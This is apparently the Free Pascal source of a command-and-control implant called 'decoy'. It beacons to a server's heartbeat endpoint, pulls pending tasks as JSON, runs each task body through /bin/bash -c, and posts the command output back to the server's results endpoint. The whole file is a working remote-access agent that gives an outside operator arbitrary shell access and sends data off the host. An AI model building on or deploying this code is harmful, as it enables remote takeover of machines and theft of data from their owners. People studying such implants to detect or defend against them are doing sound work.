program decoy;

{$mode objfpc}{$H+}

uses
  
  cthreads,FPHTTPClient,
  Classes,sysutils,process,fptimer,jsonparser,fpjson
  { you can add units after this };
var 

isconnected : boolean; 

const 


BUF_SIZE = 2048; 

profile_UUID = 'agyrtsdfc';

decoy_profile_server = '127.0.0.1';

decoy_profile_port = ':3333';

decoy_profile_type = 'http://'; 



{ agent end-point profile }

tasks_endpoint = '/tasks/view/'; 

tasks_update_status = '/tasks/update'; 

task_results = '/agents/results'; 



const  
connect_endpoint = decoy_profile_type + decoy_profile_server + decoy_profile_port; 


type
  TOnTimer = procedure(Sender: TObject) of object;
  
type
  TSync = class(Tthread)

    private 
    FTime: QWORD;
    FInterval: Cardinal;
    FOnTimer: TOnTimer;
    FEnabled: Boolean;
    procedure DoOnTimer;
   

    protected
    procedure execute; virtual;
    public
    property OnTimer: TOnTimer read FOnTimer write FOnTimer;
    property Interval: Cardinal read FInterval write FInterval;
    property Enabled: Boolean read FEnabled write FEnabled;
    procedure StopTimer;
    procedure StartTimer;
    constructor Create(CreateSuspended: Boolean);
    destructor Destroy; override;
    procedure sync_endpoint;

  end;


{GLOBAL FUNCTIONS }





function exec_command(command:String):string;
var
Process: Tprocess;
list,outp : Tstringlist;
OutputStream,Param : TStream;
BytesRead    : longint;
Buffer       : array[1..BUF_SIZE] of byte;
ID: dword;
begin


  list := Tstringlist.Create;
  outp := Tstringlist.Create;


  process := Tprocess.Create(nil);
  OutputStream := TMemoryStream.Create;
  Param := TMemoryStream.Create; // we are going to store outputs as memory stream .
  //Param.
  process.Executable:='/bin/bash';
  process.Parameters.Add('-c');
  process.Parameters.Add(command);


  process.Options:= Process.Options +[poUsePipes];
//  for i:=0 to list.Count-1 do begin
  try
  process.Execute;
  //process.Free;


  repeat
   // Get the new data from the process to a maximum of the buffer size that was allocated.
   // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
     BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
     OutputStream.Write(Buffer, BytesRead)
   until BytesRead = 0;    //stop if no more data is being recieved
   outputstream.Position:=0;
   outp.LoadFromStream(outputstream);
   process.ExitCode;
    result := outp.Text;


 finally
   process.Free;
   list.Free;
   outp.Free;
   outputstream.Free;
    end;
    end;

function send_results(path,profile_UUID,task_id,data:string):string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget,payload : string;
begin 
{

task_id := req.ContentFields.Values['task_id'];
task_body := req.ContentFields.Values['task_body'];
UUID := req.ContentFields.Values['UUID'];       
}
payload := 'UUID='+profile_UUID+'&task_id='+task_id+'&task_body='+data;

FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.formpost(path,payload);

   send_results := Resultget;
  
   except
    //  on E: exception do
      //   writeln(E.Message);
   end;
FPHTTPClient.Free;
end;
 

 //HTTP_WORKER(connect_endpoint+tasks_endpoint+'/tasks/update/','POST','','','COMPLETED',tiny_payload);

function HTTP_WORKER(path,request_type,profile_UUID,task_id,task_status,payload:string):string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin

//payload := 'UUID='+profile_UUID+'&task_id='+task_id+'&task_status='+task_status;



FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   if request_type = 'GET' then begin 
   Resultget := FPHTTPClient.Get(path) 
   end else 
   Resultget := FPHTTPClient.formpost(path,payload);

   HTTP_WORKER := Resultget;
   
   except
    //  on E: exception do
      //   writeln(E.Message);
   end;
FPHTTPClient.Free;
end;



function initi_connection(server:string):string;
var
  FPHTTPClient: TFPHTTPClient;
  Resultget,end_point,res: string;
  ok : integer;
begin
isconnected := false;


end_point := '/agent/heart_beat';

FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;

  try
   Resultget := FPHTTPClient.Get(server+end_point); // test URL, real one is HTTPS
 //  writeln(length(Resultget));
   if Length(Resultget) > 0 then 
    begin 
    // Result := Resultget;
     isconnected := true  // if connected true, timer will take and execute 
    end else 

    isconnected := false; 
   

  
  except
   //   on E: exception do

    // writeln(E.Message)

   end;
   
 
      


FPHTTPClient.Free;

end;

procedure connect; 
begin

while isconnected = false do begin 
 WriteLn('trying to connect to '+connect_endpoint);
 sleep(6000);

 initi_connection(connect_endpoint); 

end; 


end;



constructor TSync.Create(CreateSuspended: Boolean); 
begin 

 inherited Create(CreateSuspended);
  FInterval := 3000;
  FreeOnTerminate := True;
  FEnabled := True;

end; 
destructor TSync.Destroy;
begin
  //
  inherited Destroy;
end;

procedure TSync.DoOnTimer;
var 
server:string;
begin
//server := 'http://127.0.0.1:8000'; 
//isconnected := False;
  if Assigned(FOnTimer) then
    FOnTimer(Self);
    if isconnected = True then 
    sync_endpoint 
    else 
    connect;
end;
 
procedure TSync.execute; 
var 
server : string; 

begin 

while not Terminated do
  begin
    Sleep(1);
    if (GetTickCount64 - FTime > FInterval) and (FEnabled) then
    begin
      FTime := GetTickCount64;
      Synchronize(@DoOnTimer);
    end;
  end;
  end;

 procedure TSync.StopTimer;
begin
  FEnabled := False;
end;
 
procedure TSync.StartTimer;
begin
  FTime := GetTickCount64;
  FEnabled := True;
  if Self.Suspended then
    Start;
end; 

procedure TSync.sync_endpoint; // this is main procedure to get assigned tasks 
var 
rs,task_data,task_status,task_id,outdata : string; 
jData : TJSONData;
tiny_payload : string; 

begin

rs := HTTP_WORKER(connect_endpoint+tasks_endpoint+'?profile_UUID='+profile_UUID,'GET',profile_UUID,'','','');

if length(rs) > 2 then begin
jData := GetJSON(rs);

task_data := Jdata.FindPath('task_body').AsString;
task_status := Jdata.FindPath('task_status').AsString;
task_id := Jdata.FindPath('task_id').AsString; 

if task_status = 'PENDING' then begin
outdata := exec_command(task_data); 
//WriteLn(outdata); // will write that to terminat to see if we can execute 
//WriteLn(task_id);
//end;
//if length(output) > 1 then begin 
//task_id=10019&task_status=COMPLETED
tiny_payload := 'uuid='+profile_UUID+'&task_id='+task_id+'&task_status=COMPLETED';

HTTP_WORKER(connect_endpoint+'/tasks/update/','POST','','','COMPLETED',tiny_payload);

send_results(connect_endpoint+'/tasks/results/',profile_UUID,task_id,outdata);

end; 


end;
end;




var 
Th : TSync; 
begin
Th := TSync.Create(true);
Th.execute;
connect;





end.

